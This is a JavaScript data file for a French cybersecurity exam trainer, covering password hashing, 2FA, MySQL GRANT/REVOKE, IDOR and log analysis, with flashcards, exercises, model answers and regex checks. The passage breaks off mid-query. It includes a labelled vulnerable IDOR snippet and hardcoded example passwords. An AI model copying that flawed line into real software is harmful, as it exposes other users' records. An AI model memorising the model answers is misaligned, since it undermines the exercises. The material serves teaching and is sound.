/* U7 Cyber SLAM · contenu du trainer
   Pour chaque section : cours condensé, flashcards (rappel actif), ateliers de code.
   Les "checks" sont des indices de vérification, pas un juge : le code libre reste libre. */

const DATA = [

/* ============================== 00 ============================== */
{
  id: "00-methode",
  num: "00",
  title: "Méthode : lire un sujet en 5 minutes",
  tag: "Tous les sujets",
  hot: false,
  intro: "L'ordre de lecture n'est pas l'ordre du sujet. Cinq minutes de cadrage valent vingt minutes de rédaction.",
  cours: `
  <h2>1. L'ordre de lecture</h2>
  <ol>
    <li><strong>Le tableau de points en page 1.</strong> Il donne les gros dossiers. Un dossier à 15 points mérite 15 minutes, un dossier à 35 points en mérite 70.</li>
    <li><strong>Le dossier documentaire en annexe</strong> (8 à 15 pages). C'est là que vivent les extraits de code, les tables SQL, les logs, les schémas. <strong>90 % des réponses y sont littéralement.</strong></li>
    <li><strong>Les verbes de consigne</strong>, survolés pour calibrer la longueur attendue.</li>
    <li><strong>Les renvois d'annexes</strong> ("à l'aide de l'annexe 3"). Répondre sans lire l'annexe, c'est perdre les points à coup sûr.</li>
    <li><strong>Les 10 dernières minutes</strong> sont réservées à la relecture. Une question vide vaut 0, une question bâclée vaut souvent 1 ou 2 points sur 3.</li>
  </ol>

  <h2>2. Les verbes de consigne</h2>
  <table class="tbl">
    <caption>Ce que le correcteur attend derrière chaque verbe</caption>
    <thead><tr><th>Verbe</th><th>Attendu</th><th>Erreur fatale</th></tr></thead>
    <tbody>
      <tr><td><strong>Citer</strong></td><td>Recopier l'élément du document</td><td>Reformuler de mémoire</td></tr>
      <tr><td><strong>Justifier</strong></td><td>Cause, puis conséquence</td><td>Donner la réponse sans explication</td></tr>
      <tr><td><strong>Compléter</strong></td><td>Remplir uniquement les trous</td><td>Réécrire toute la fonction</td></tr>
      <tr><td><strong>Proposer</strong></td><td>Solution argumentée, plusieurs pistes</td><td>Une solution unique non justifiée</td></tr>
      <tr><td><strong>Écrire</strong></td><td>Code ou requête syntaxiquement correcte</td><td>Pseudo-code approximatif</td></tr>
      <tr><td><strong>Analyser</strong></td><td>Décomposer, puis conclure</td><td>Décrire sans conclusion</td></tr>
    </tbody>
  </table>

  <h2>3. Ce que le correcteur attend</h2>
  <p>Il a un <strong>barème à cases</strong>. Chaque case correspond à une idée, pas à une phrase.</p>
  <ul>
    <li>Réponse en liste numérotée, une idée par ligne.</li>
    <li>Un mot-clé technique par ligne, parce que c'est le mot que le correcteur cherche.</li>
    <li>Jamais "c'est plus sécurisé" sans dire <em>quoi</em> protège <em>contre quoi</em>.</li>
  </ul>

  <div class="callout callout--key">
    <span class="callout__label">Réflexe</span>
    <p>Une question à 3 points attend 3 idées distinctes, ou 1 idée + 1 justification + 1 exemple. Écris trois lignes numérotées, pas un paragraphe de douze lignes.</p>
  </div>
  `,
  cards: [
    { id: "m1", q: "Par quoi commence-t-on quand on reçoit le sujet ?", a: "Par le <strong>tableau de points de la page 1</strong>. Il donne le poids de chaque dossier, donc le budget temps à répartir." },
    { id: "m2", q: "Où se trouvent 90 % des réponses ?", a: "Dans le <strong>dossier documentaire en annexe</strong> : extraits de code, tables SQL, logs, schémas. Il faut lire les annexes citées avant de rédiger." },
    { id: "m3", q: "Différence entre <em>citer</em> et <em>justifier</em> ?", a: "<strong>Citer</strong> : recopier l'élément du document tel quel. <strong>Justifier</strong> : expliquer cause puis conséquence. Une justification vaut souvent 2 points contre 1 pour la réponse seule." },
    { id: "m4", q: "Que veut dire l'expression « barème à cases » ?", a: "Chaque point correspond à une idée attendue. D'où l'intérêt d'écrire une idée par ligne numérotée, pour que le correcteur coche les cases une à une." },
    { id: "m5", q: "Combien de temps garder à la fin, et pourquoi ?", a: "Dix minutes de relecture. Une question vide vaut 0, une question bâclée rapporte souvent 1 ou 2 points sur 3." },
    { id: "m6", q: "Comment répartir 4 h si le sujet annonce A = 42 points et B = 38 points ?", a: "En proportion du poids, pas du nombre de pages : environ 70 minutes sur A et 65 sur B, le reste en lecture initiale, marges et relecture." }
  ],
  ateliers: [
    {
      id: "at-methode-plan",
      title: "Construis ton plan de 4 heures",
      lang: "text",
      prompt: `<p>Sujet fictif : dossier A = 42 points, dossier B = 38 points, 240 minutes au total. Écris ton découpage minute par minute : lecture, dossier A, dossier B, relecture.</p>
      <p>L'objectif n'est pas la précision mathématique, c'est de <strong>décider à l'avance</strong> ce que tu abandonnes si le temps manque.</p>`,
      starter: `00:00 - 00:10  lecture du sujet + tableau de points
00:10 - `,
      model: `00:00 - 00:10  Lecture du sujet, tableau de points, repérage des annexes
00:10 - 00:20  Lecture des annexes citées (code, tables, logs)
00:20 - 01:30  Dossier A (42 pts) : 70 min
01:30 - 02:35  Dossier B (38 pts) : 65 min
02:35 - 02:50  Marge imprévu (question bloquante, requête à refaire)
02:50 - 03:50  Finitions : questions non traitées, justifications manquantes
03:50 - 04:00  Relecture : "justifier" vérifiées, aucune question vide

Règle de secours : si 01:30 arrive et que le dossier A n'est pas fini,
on écrit une réponse courte sur les questions restantes et on passe.
Mieux vaut 12 points sur 15 répartis que 15 sur 15 avec 20 points laissés vides.`,
      checks: []
    }
  ]
},

/* ============================== 01 ============================== */
{
  id: "01-authentification",
  num: "01",
  title: "Authentification & mots de passe",
  tag: "8 sujets sur 9",
  hot: true,
  intro: "Le thème le plus rentable de l'épreuve. Trois notions à ne jamais confondre, une fonction PHP à écrire les yeux fermés.",
  cours: `
  <h2>1. Identification, authentification, habilitation</h2>
  <table class="tbl">
    <caption>Trois notions, trois questions différentes</caption>
    <thead><tr><th>Notion</th><th>Question</th><th>Exemple</th></tr></thead>
    <tbody>
      <tr><td><strong>Identification</strong></td><td>Qui prétends-tu être ?</td><td>saisir <code>jdupont</code></td></tr>
      <tr><td><strong>Authentification</strong></td><td>Prouve-le</td><td>mot de passe, 2FA</td></tr>
      <tr><td><strong>Habilitation</strong></td><td>Qu'as-tu le droit de faire ?</td><td>rôle <code>gestionnaire</code></td></tr>
    </tbody>
  </table>
  <div class="callout callout--warn">
    <span class="callout__label">Piège classique</span>
    <p>"Quel mécanisme garantit qu'un utilisateur n'accède qu'à ses propres fiches ?" Ce n'est <strong>pas</strong> l'authentification, c'est <strong>l'habilitation</strong> (contrôle d'accès).</p>
  </div>

  <h2>2. Pourquoi hacher un mot de passe</h2>
  <p>Un mot de passe ne se stocke jamais en clair, jamais chiffré (réversible), toujours <strong>haché</strong> (irréversible).</p>
  <p><strong>Pourquoi MD5 et SHA1 sont interdits :</strong></p>
  <ol>
    <li>Trop rapides : un GPU teste des milliards de combinaisons par seconde.</li>
    <li>Cassés par les <strong>rainbow tables</strong> (tables précalculées hash vers mot de passe).</li>
    <li>Ce ne sont pas des fonctions conçues pour les mots de passe, mais pour vérifier l'intégrité d'un fichier.</li>
  </ol>
  <p>Ce qu'il faut : une fonction <strong>lente</strong> et <strong>paramétrable</strong>, donc <code>bcrypt</code> (<code>password_hash</code>), <code>argon2id</code> ou <code>scrypt</code>.</p>

  <h2>3. Le sel</h2>
  <ul>
    <li><strong>Sel</strong> : valeur aléatoire unique ajoutée au mot de passe avant hachage.</li>
    <li>Deux utilisateurs avec <code>azerty</code> obtiennent deux hashs différents.</li>
    <li>Le sel rend les rainbow tables inexploitables, il faudrait une table par sel.</li>
    <li><strong>Le sel n'est pas secret</strong> : il est stocké à côté du hash, à l'intérieur de la chaîne. C'est un <em>poivre</em> (pepper) qui serait secret.</li>
  </ul>

  <h2>4. Le code à connaître par cœur</h2>
  <pre class="codeblock"><code class="lang-php">// Inscription ou changement de mot de passe
$hash = password_hash($motDePasseClair, PASSWORD_DEFAULT); // bcrypt, sel automatique
// stocker $hash dans une colonne VARCHAR(255)

// Verification a la connexion
if (password_verify($mdpSaisi, $hashStocke)) {
    // authentifie
}

// Mise a jour transparente si l'algorithme par defaut evolue
if (password_needs_rehash($hashStocke, PASSWORD_DEFAULT)) {
    $nouveau = password_hash($mdpSaisi, PASSWORD_DEFAULT);
    // UPDATE utilisateur SET mdp = :h WHERE id = :id
}</code></pre>
  <p><strong>À savoir expliquer :</strong> <code>password_hash</code> génère le sel et l'inclut dans la chaîne retournée. <code>password_verify</code> relit algorithme, coût et sel depuis cette chaîne, donc rien à stocker séparément. La colonne fait au moins 60 caractères, <code>VARCHAR(255)</code> est la norme. Une colonne <code>CHAR(32)</code> trahit un MD5.</p>

  <h2>5. Politique de complexité</h2>
  <p>Schéma récurrent : un docblock, des jeux de test, et tu écris la fonction.</p>
  <pre class="codeblock"><code class="lang-php">/**
 * Verifie que le mot de passe respecte la politique de securite.
 * @param string $mdp  Mot de passe en clair
 * @return bool  true si valide, false sinon
 */
function valideMotDePasse(string $mdp): bool {
    if (strlen($mdp) &lt; 12) { return false; }

    $minuscule = false; $majuscule = false; $chiffre = false; $special = false;
    for ($i = 0; $i &lt; strlen($mdp); $i++) {
        $c = $mdp[$i];
        if (ctype_lower($c))     { $minuscule = true; }
        elseif (ctype_upper($c)) { $majuscule = true; }
        elseif (ctype_digit($c)) { $chiffre   = true; }
        else                     { $special   = true; }
    }
    return $minuscule &amp;&amp; $majuscule &amp;&amp; $chiffre &amp;&amp; $special;
}</code></pre>
  <p>Version regex équivalente :</p>
  <pre class="codeblock"><code class="lang-php">function valideMotDePasseRegex(string $mdp): bool {
    return (bool) preg_match(
        '/^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[^a-zA-Z0-9]).{12,}$/',
        $mdp
    );
}</code></pre>
  <ul>
    <li><code>(?=.*[a-z])</code> : lookahead, "il existe une minuscule quelque part".</li>
    <li><code>(?=.*[A-Z])</code> : une majuscule quelque part.</li>
    <li><code>(?=.*[0-9])</code> : un chiffre quelque part.</li>
    <li><code>(?=.*[^a-zA-Z0-9])</code> : un caractère qui n'est ni lettre ni chiffre.</li>
    <li><code>.{12,}</code> : au moins 12 caractères au total.</li>
  </ul>
  <div class="callout callout--key">
    <span class="callout__label">Méthode de complétion</span>
    <p>1. Lis le docblock (types, cas limites). 2. Lis les jeux de test, ce sont eux qui rapportent. 3. Écris d'abord les cas de rejet. 4. Le <code>return true</code> en dernier. 5. N'oublie jamais le <code>return</code> final, une fonction qui ne renvoie rien vaut 0.</p>
  </div>

  <h2>6. Historique des mots de passe</h2>
  <p>Table <code>historique_mdp(id, id_utilisateur, hash, date_creation)</code>. On compare le nouveau mot de passe aux 3 derniers <strong>avec <code>password_verify</code></strong>, puisque ce sont des hashs. Puis on purge au-delà de 3.</p>
  <p>Erreur à ne pas commettre : <code>WHERE mdp = :nouveau</code>. Impossible, tous les hashs diffèrent à cause du sel.</p>

  <h2>7. 2FA et anti brute force</h2>
  <p>Les trois familles de facteurs, à citer par leur nom :</p>
  <ol>
    <li><strong>Ce que je sais</strong> : mot de passe, code PIN.</li>
    <li><strong>Ce que je possède</strong> : téléphone (TOTP, SMS), clé FIDO2, badge.</li>
    <li><strong>Ce que je suis</strong> : empreinte, reconnaissance faciale.</li>
  </ol>
  <p>Le 2FA combine <strong>deux catégories différentes</strong>. Mot de passe + question secrète n'est pas du 2FA, les deux relèvent de "ce que je sais".</p>
  <p>Limites : le SMS cède au <em>SIM swapping</em>, le TOTP est préférable, FIDO2 est le plus robuste (résistant au phishing).</p>
  <p><strong>Anti brute force :</strong> compteur par compte et par IP, verrouillage temporaire (15 min) plutôt que définitif pour éviter un déni de service, délai progressif, et journalisation de ces événements.</p>
  `,
  cards: [
    { id: "a1", q: "Un utilisateur ne doit accéder qu'à ses propres factures. C'est de l'authentification ou de l'habilitation ?", a: "<strong>De l'habilitation</strong> (contrôle d'accès). L'authentification prouve l'identité, elle ne dit rien des droits sur une ressource précise." },
    { id: "a2", q: "Pourquoi ne jamais stocker un mot de passe chiffré ?", a: "Le chiffrement est <strong>réversible</strong>. Si la clé fuite, tous les mots de passe tombent. Le hachage est irréversible : même avec la base, on ne remonte pas au mot de passe." },
    { id: "a3", q: "Trois raisons d'interdire MD5 et SHA1 pour les mots de passe", a: "<ol><li>Trop rapides, un GPU teste des milliards de combinaisons par seconde.</li><li>Cassés par les <em>rainbow tables</em>.</li><li>Conçues pour l'intégrité de fichier, pas pour les mots de passe.</li></ol>" },
    { id: "a4", q: "Qu'est-ce qu'un sel, et pourquoi n'est-il pas secret ?", a: "Une valeur aléatoire unique ajoutée avant hachage. Deux fois <code>azerty</code> donnent deux hashs différents. Il est stocké à côté du hash : ce n'est pas un secret, c'est ce qui rend les tables précalculées inutiles." },
    { id: "a5", q: "Que contient concrètement la chaîne <code>$2y$10$...</code> ?", a: "L'algorithme (<code>2y</code> = bcrypt), le coût (<code>10</code>) et le sel. C'est pour ça que <code>password_verify</code> n'a besoin de rien d'autre que la chaîne." },
    { id: "a6", q: "Quelle taille pour la colonne qui stocke le hash ?", a: "<code>VARCHAR(255)</code>. Le minimum de bcrypt est 60 caractères. Une colonne <code>CHAR(32)</code> est la signature d'un MD5, donc une erreur de sécurité." },
    { id: "a7", q: "Comment implémenter l'interdiction de réutiliser les 3 derniers mots de passe ?", a: "Table <code>historique_mdp(id, id_utilisateur, hash, date_creation)</code>, comparaison du nouveau mot de passe avec <code>password_verify</code> sur les 3 derniers hashs, puis purge au-delà. Jamais de comparaison directe <code>WHERE mdp = :nouveau</code>, le sel rend chaque hash unique." },
    { id: "a8", q: "Mot de passe + question secrète, est-ce du 2FA ?", a: "<strong>Non.</strong> Les deux relèvent de \"ce que je sais\". Il faut deux catégories différentes : savoir + posséder, ou savoir + être." },
    { id: "a9", q: "Pourquoi un verrouillage temporaire plutôt que définitif ?", a: "Un verrouillage définitif permet à un attaquant de bloquer le compte d'un utilisateur légitime, donc un déni de service. 15 minutes suffisent à casser une attaque automatisée." },
    { id: "a10", q: "Quel est le risque de l'énumération des comptes ?", a: "Un message d'erreur différent selon que le login existe ou non permet de cartographier les comptes. La bonne pratique est un message générique du type \"identifiants incorrects\"." }
  ],
  ateliers: [
    {
      id: "at-mdp-fonction",
      title: "Écris valideMotDePasse()",
      lang: "php",
      prompt: `<p>Contraintes du sujet : au moins 12 caractères, au moins une minuscule, une majuscule, un chiffre et un caractère spécial. Retourne un booléen.</p>
      <p>Écris la version que tu saurais produire en examen, sans regarder le cours. Les indices de vérification ne jugent que la structure, le style reste le tien.</p>`,
      starter: `function valideMotDePasse(string $mdp): bool {

    return false;
}`,
      model: `function valideMotDePasse(string $mdp): bool {
    // 1. Taille minimale
    if (strlen($mdp) < 12) {
        return false;
    }

    // 2. Presence des 4 familles de caracteres
    $minuscule = false;
    $majuscule = false;
    $chiffre   = false;
    $special   = false;

    for ($i = 0; $i < strlen($mdp); $i++) {
        $c = $mdp[$i];
        if (ctype_lower($c)) {
            $minuscule = true;
        } elseif (ctype_upper($c)) {
            $majuscule = true;
        } elseif (ctype_digit($c)) {
            $chiffre = true;
        } else {
            $special = true;
        }
    }

    return $minuscule && $majuscule && $chiffre && $special;
}

// Variante regex acceptee :
// return (bool) preg_match('/^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[^a-zA-Z0-9]).{12,}$/', $mdp);`,
      checks: [
        { label: "Fonction nommée avec un type de retour bool", test: /function\s+valideMotDePasse\s*\(\s*string\s+\$mdp\s*\)\s*:\s*bool/i },
        { label: "Vérifie la longueur minimale de 12", test: /strlen\s*\(\s*\$mdp\s*\)\s*<\s*12|mb_strlen\s*\(\s*\$mdp\s*\)\s*<\s*12/i },
        { label: "Détecte une minuscule et une majuscule", test: /ctype_lower|preg_match/i },
        { label: "Détecte un chiffre", test: /ctype_digit|is_numeric|\[0-9\]|\\d/i },
        { label: "Détecte un caractère spécial", test: /ctype_punct|\[\\^a-zA-Z0-9\]|\[\\W_\]|else\s*\{/i },
        { label: "Retourne un booléen combinant les tests", test: /return\s+\$minuscule\s*&&|return\s*\(bool\)\s*preg_match|return\s+preg_match/i }
      ]
    },
    {
      id: "at-mdp-verify",
      title: "Vérifie un mot de passe à la connexion",
      lang: "php",
      prompt: `<p>Tu reçois <code>$mdpSaisi</code> (en clair, depuis un formulaire) et <code>$hashStocke</code> (lu en base). Écris la vérification correcte, puis la mise à jour du hash si l'algorithme par défaut a évolué.</p>`,
      starter: `$mdpSaisi   = $_POST['mdp'];
$hashStocke = $utilisateur['mdp'];

`,
      model: `$mdpSaisi   = $_POST['mdp'];
$hashStocke = $utilisateur['mdp'];

if (password_verify($mdpSaisi, $hashStocke)) {

    // Mot de passe correct : on verifie si le hash doit etre mis a jour
    if (password_needs_rehash($hashStocke, PASSWORD_DEFAULT)) {
        $nouveauHash = password_hash($mdpSaisi, PASSWORD_DEFAULT);
        $stmt = $pdo->prepare('UPDATE utilisateur SET mdp = :h WHERE id = :id');
        $stmt->execute([':h' => $nouveauHash, ':id' => $utilisateur['id']]);
    }

    // Regenerer l'identifiant de session apres authentification
    session_regenerate_id(true);
    $_SESSION['id_utilisateur'] = $utilisateur['id'];

} else {
    // Message generique : on n'indique pas si le login existe
    $erreur = 'Identifiants incorrects.';
}`,
      checks: [
        { label: "Utilise password_verify", test: /password_verify\s*\(/i },
        { label: "Aucun md5 / sha1 dans le code", test: /^(?![\s\S]*\b(md5|sha1)\s*\()/i },
        { label: "Utilise password_needs_rehash", test: /password_needs_rehash/i },
        { label: "Re-hache avec password_hash", test: /password_hash\s*\(/i },
        { label: "Régénère l'identifiant de session", test: /session_regenerate_id/i }
      ]
    }
  ]
},


/* ============================== 02 ============================== */
{
  id: "02-habilitations",
  num: "02",
  title: "Habilitations, droits & GRANT / REVOKE",
  tag: "6 sujets sur 9",
  hot: true,
  intro: "Le thème le plus mécanique. Si tu connais la syntaxe, tu marques. 15 à 25 points fréquents, souvent offerts.",
  cours: `
  <h2>1. Principe de moindre privilège</h2>
  <p>Un utilisateur ou un programme ne dispose que des droits <strong>strictement nécessaires</strong> à sa tâche, et seulement le temps nécessaire.</p>
  <p>Application : le site se connecte à MySQL avec un compte qui a <code>SELECT, INSERT, UPDATE, DELETE</code> sur <strong>une seule base</strong>. Pas de <code>DROP</code>, pas de <code>GRANT OPTION</code>, pas de <code>root</code>.</p>

  <h2>2. Créer un utilisateur</h2>
  <pre class="codeblock"><code class="lang-sql">-- Compte local uniquement
CREATE USER 'app_ndv'@'localhost' IDENTIFIED BY 'MotDePasse!Fort2026';

-- Compte utilisable depuis le sous-reseau applicatif
CREATE USER 'app_ndv'@'10.20.30.%' IDENTIFIED BY 'MotDePasse!Fort2026';</code></pre>
  <div class="callout callout--warn">
    <span class="callout__label">Piège</span>
    <p>Le <code>@hôte</code> n'est pas décoratif. <code>'app_ndv'@'localhost'</code> et <code>'app_ndv'@'%'</code> sont <strong>deux comptes distincts</strong> avec des droits distincts. Question fréquente : "pourquoi la connexion échoue depuis le serveur web alors que l'utilisateur existe ?" Parce qu'il existe pour localhost, pas pour l'IP du serveur web.</p>
  </div>

  <h2>3. GRANT et REVOKE</h2>
  <pre class="codeblock"><code class="lang-sql">GRANT SELECT, INSERT, UPDATE, DELETE
  ON ndv.contrat
  TO 'app_ndv'@'10.20.30.%';

-- Droits au niveau colonne
GRANT SELECT (id, nom, date_debut)
  ON ndv.contrat
  TO 'lecteur_rh'@'localhost';

REVOKE DELETE ON ndv.contrat FROM 'app_ndv'@'10.20.30.%';
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'app_ndv'@'10.20.30.%';</code></pre>
  <p>Structure : <code>GRANT &lt;privilèges&gt; ON &lt;base&gt;.&lt;table&gt; TO &lt;compte&gt;;</code></p>
  <table class="tbl">
    <caption>Privilèges et niveaux</caption>
    <thead><tr><th>Famille</th><th>Privilèges</th></tr></thead>
    <tbody>
      <tr><td>Lecture / écriture</td><td><code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code></td></tr>
      <tr><td>Structure</td><td><code>CREATE</code>, <code>ALTER</code>, <code>DROP</code>, <code>INDEX</code>, <code>REFERENCES</code></td></tr>
      <tr><td>Exécution</td><td><code>EXECUTE</code> (procédures stockées)</td></tr>
      <tr><td>Administration</td><td><code>ALL PRIVILEGES</code>, <code>GRANT OPTION</code> (re-délégation, à éviter)</td></tr>
      <tr><td>Niveaux</td><td><code>*.*</code> serveur, <code>base.*</code>, <code>base.table</code></td></tr>
    </tbody>
  </table>
  <p><strong>Réflexe :</strong> après une modification manuelle des tables système, <code>FLUSH PRIVILEGES;</code>. Pas nécessaire via GRANT/REVOKE en MySQL 8 et MariaDB 10.4+, mais accepté et sans risque.</p>
  <p><strong>Vérification, la commande à citer :</strong> <code>SHOW GRANTS FOR 'app_ndv'@'10.20.30.%';</code></p>

  <h2>4. Habilitation applicative, distincte des droits SGBD</h2>
  <p>Deux niveaux coexistent souvent dans le même dossier :</p>
  <ul>
    <li><strong>Droits SGBD</strong> : <code>GRANT</code> / <code>REVOKE</code>, gérés par MySQL.</li>
    <li><strong>Habilitations applicatives</strong> : profils et rôles vérifiés par le code PHP avant l'affichage.</li>
  </ul>
  <pre class="codeblock"><code class="lang-text">utilisateur(id, login, mdp_hash, id_profil)
profil(id, libelle)
droit(id, libelle)                    -- ex : "consulter_contrat"
profil_droit(id_profil, id_droit)     -- association N:N</code></pre>
  <pre class="codeblock"><code class="lang-sql">SELECT d.libelle
FROM utilisateur u
JOIN profil        p  ON p.id = u.id_profil
JOIN profil_droit  pd ON pd.id_profil = p.id
JOIN droit         d  ON d.id = pd.id_droit
WHERE u.login = 'jdupont';</code></pre>

  <h2>5. Contrôle d'accès dans le code (IDOR)</h2>
  <pre class="codeblock"><code class="lang-php">// VULNERABLE : n'importe quel utilisateur connecte lit la facture n°&lt;n&gt;
$facture = getFacture($_GET['id']);

// CORRECT : on verifie la propriete de la ressource
$facture = getFacture($_GET['id'], $_SESSION['id_utilisateur']);
// => WHERE id = :id AND id_client = :id_client</code></pre>
  <p>Nom de la faille : <strong>IDOR</strong> (<em>Insecure Direct Object Reference</em>), classée <strong>A01 Broken Access Control</strong> dans l'OWASP Top 10.</p>
  `,
  cards: [
    { id: "h1", q: "Énonce le principe de moindre privilège", a: "Un utilisateur ou un programme ne dispose que des droits <strong>strictement nécessaires</strong> à sa tâche, et seulement le temps nécessaire." },
    { id: "h2", q: "Écris la commande qui crée un compte MySQL limité à localhost", a: "<code>CREATE USER 'app_ndv'@'localhost' IDENTIFIED BY 'motdepasse';</code>" },
    { id: "h3", q: "Pourquoi <code>'app'@'localhost'</code> et <code>'app'@'%'</code> sont-ils différents ?", a: "Le <code>@hôte</code> fait partie de l'identité du compte. Ce sont deux comptes distincts, avec des droits distincts. Un compte créé pour localhost refuse une connexion depuis l'IP du serveur web." },
    { id: "h4", q: "Sous quel format s'écrit un GRANT ?", a: "<code>GRANT &lt;privilèges&gt; ON &lt;base&gt;.&lt;table&gt; TO &lt;compte&gt;;</code> Par exemple <code>GRANT SELECT, INSERT ON ndv.contrat TO 'app_ndv'@'10.20.30.%';</code>" },
    { id: "h5", q: "Quelle commande vérifie les droits réellement appliqués ?", a: "<code>SHOW GRANTS FOR 'app_ndv'@'10.20.30.%';</code> C'est la réponse attendue à la question \"comment vérifier que les droits sont correctement appliqués\"." },
    { id: "h6", q: "Pourquoi éviter <code>GRANT OPTION</code> ?", a: "Il permet au compte de re-déléguer ses propres privilèges à d'autres comptes. Un compte applicatif compromis pourrait alors se créer des accès persistants. C'est une violation du moindre privilège." },
    { id: "h7", q: "Différence entre droits SGBD et habilitation applicative ?", a: "Les droits SGBD (GRANT/REVOKE) limitent ce que le compte MySQL peut faire. L'habilitation applicative limite ce qu'un utilisateur connecté peut voir ou modifier, via son profil vérifié dans le code PHP." },
    { id: "h8", q: "Qu'est-ce qu'un IDOR et comment le corriger ?", a: "L'application vérifie que l'utilisateur est connecté, mais pas qu'il possède la ressource demandée. Correction : filtrer la requête sur l'identifiant du propriétaire (<code>WHERE id = :id AND id_client = :id_client</code>). OWASP A01." }
  ],
  ateliers: [
    {
      id: "at-grant-create",
      title: "Crée le compte applicatif et donne les droits minimaux",
      lang: "sql",
      prompt: `<p>Le site tourne sur le serveur <code>10.20.30.15</code> et doit accéder à la base <code>ndv</code>, table <code>contrat</code>, en lecture et écriture uniquement.</p>
      <p>Écris les deux instructions : création du compte pour le sous-réseau <code>10.20.30.%</code>, puis attribution des droits. Aucun droit de structure, aucune délégation.</p>`,
      starter: `CREATE USER `,
      model: `CREATE USER 'app_ndv'@'10.20.30.%' IDENTIFIED BY 'MotDePasse!Fort2026';

GRANT SELECT, INSERT, UPDATE, DELETE
  ON ndv.contrat
  TO 'app_ndv'@'10.20.30.%';

-- Verification
SHOW GRANTS FOR 'app_ndv'@'10.20.30.%';`,
      checks: [
        { label: "CREATE USER avec le bon hôte (10.20.30.%)", test: /CREATE\s+USER\s+'app_ndv'@'10\.20\.30\.%'/i },
        { label: "Mot de passe défini avec IDENTIFIED BY", test: /IDENTIFIED\s+BY\s+'[^']+'/i },
        { label: "GRANT sur ndv.contrat", test: /GRANT[\s\S]*?ON\s+ndv\.contrat/i },
        { label: "Les 4 privilèges DML exactement", test: /SELECT[\s\S]*?INSERT[\s\S]*?UPDATE[\s\S]*?DELETE/i },
        { label: "Aucun ALL PRIVILEGES ni GRANT OPTION", test: /^(?![\s\S]*(ALL\s+PRIVILEGES|GRANT\s+OPTION))/i },
        { label: "Pense à vérifier avec SHOW GRANTS", test: /SHOW\s+GRANTS/i }
      ]
    },
    {
      id: "at-grant-revoke",
      title: "Retire un droit devenu inutile",
      lang: "sql",
      prompt: `<p>Audit de sécurité : le compte applicatif n'a plus besoin de supprimer des contrats, la suppression est passée en soft delete (colonne <code>supprime</code>).</p>
      <p>Écris le retrait du seul droit <code>DELETE</code>, puis la vérification.</p>`,
      starter: `REVOKE `,
      model: `REVOKE DELETE ON ndv.contrat FROM 'app_ndv'@'10.20.30.%';

SHOW GRANTS FOR 'app_ndv'@'10.20.30.%';`,
      checks: [
        { label: "REVOKE sur le bon privilège", test: /REVOKE\s+DELETE/i },
        { label: "Cible ndv.contrat", test: /ON\s+ndv\.contrat/i },
        { label: "Utilise FROM avec le compte complet", test: /FROM\s+'app_ndv'@'10\.20\.30\.%'/i },
        { label: "Vérifie ensuite avec SHOW GRANTS", test: /SHOW\s+GRANTS/i }
      ]
    },
    {
      id: "at-droits-utilisateur",
      title: "Liste les droits d'un utilisateur",
      lang: "sql",
      prompt: `<p>Tables : <code>utilisateur(id, login, id_profil)</code>, <code>profil(id, libelle)</code>, <code>droit(id, libelle)</code>, <code>profil_droit(id_profil, id_droit)</code>.</p>
      <p>Écris la requête qui affiche les libellés de droits du login <code>jdupont</code>.</p>`,
      starter: `SELECT `,
      model: `SELECT d.libelle
FROM utilisateur u
JOIN profil       p  ON p.id = u.id_profil
JOIN profil_droit pd ON pd.id_profil = p.id
JOIN droit        d  ON d.id = pd.id_droit
WHERE u.login = 'jdupont';`,
      checks: [
        { label: "Part de la table utilisateur", test: /FROM\s+utilisateur/i },
        { label: "Joint profil via id_profil", test: /JOIN\s+profil\s+\w*\s*ON\s+\w*\.?id\s*=\s*\w*\.?id_profil/i },
        { label: "Passe par la table de jointure profil_droit", test: /profil_droit/i },
        { label: "Joint la table droit", test: /JOIN\s+droit/i },
        { label: "Filtre sur le login jdupont", test: /WHERE\s+\w*\.?login\s*=\s*'jdupont'/i }
      ]
    }
  ]
},

/* ============================== 03 ============================== */
{
  id: "03-journalisation",
  num: "03",
  title: "Journalisation & preuve d'intrusion",
  tag: "8 sujets sur 9",
  hot: true,
  intro: "Souvent formulé comme une enquête : à partir des journaux, identifie ce qui s'est passé. Le barème suit une trame en 4 lignes.",
  cours: `
  <h2>1. Trois finalités à citer</h2>
  <ol>
    <li><strong>Détection</strong> : repérer une attaque en cours (échecs répétés, volume anormal).</li>
    <li><strong>Investigation</strong> : reconstituer ce qui s'est passé, quand, depuis où.</li>
    <li><strong>Traçabilité et conformité</strong> : le RGPD impose de pouvoir prouver qui a accédé à quelles données personnelles.</li>
  </ol>

  <h2>2. Ce qu'un bon log contient</h2>
  <ul>
    <li><strong>Horodatage</strong>, idéalement en UTC avec fuseau.</li>
    <li><strong>Identifiant utilisateur</strong>, ou "anonyme".</li>
    <li><strong>Adresse IP</strong> source.</li>
    <li><strong>Action</strong> : connexion, consultation, modification, suppression.</li>
    <li><strong>Résultat</strong> : succès ou échec.</li>
    <li><strong>Ressource</strong> concernée.</li>
    <li><strong>Jamais</strong> : mot de passe, numéro de carte, jeton complet.</li>
  </ul>

  <h2>3. Table de logs type</h2>
  <pre class="codeblock"><code class="lang-sql">CREATE TABLE journal (
  id             INT AUTO_INCREMENT PRIMARY KEY,
  horodatage     DATETIME    NOT NULL,
  id_utilisateur INT         NULL,       -- NULL si echec d'authentification
  login_saisi    VARCHAR(50) NULL,
  adresse_ip     VARCHAR(45) NOT NULL,   -- 45 = taille max d'une IPv6
  action         VARCHAR(50) NOT NULL,   -- 'connexion', 'consultation'...
  succes         TINYINT(1)  NOT NULL,
  details        TEXT        NULL
);</code></pre>
  <p>Le <code>VARCHAR(45)</code> pour l'IP est un classique : IPv6 fait 39 caractères maximum, on garde une marge. Le <code>id_utilisateur</code> est <code>NULL</code> quand l'authentification échoue, on conserve alors le <code>login_saisi</code>.</p>

  <h2>4. Les quatre requêtes d'investigation</h2>
  <p><strong>a) Détecter une force brute</strong> (même IP, beaucoup d'échecs)</p>
  <pre class="codeblock"><code class="lang-sql">SELECT adresse_ip, COUNT(*) AS nb_echecs
FROM journal
WHERE action = 'connexion' AND succes = 0
  AND horodatage >= NOW() - INTERVAL 1 HOUR
GROUP BY adresse_ip
HAVING nb_echecs > 5
ORDER BY nb_echecs DESC;</code></pre>
  <p><strong>b) Prouver qu'un compte a été compromis</strong></p>
  <pre class="codeblock"><code class="lang-sql">SELECT *
FROM journal
WHERE login_saisi = 'jdupont' AND action = 'connexion'
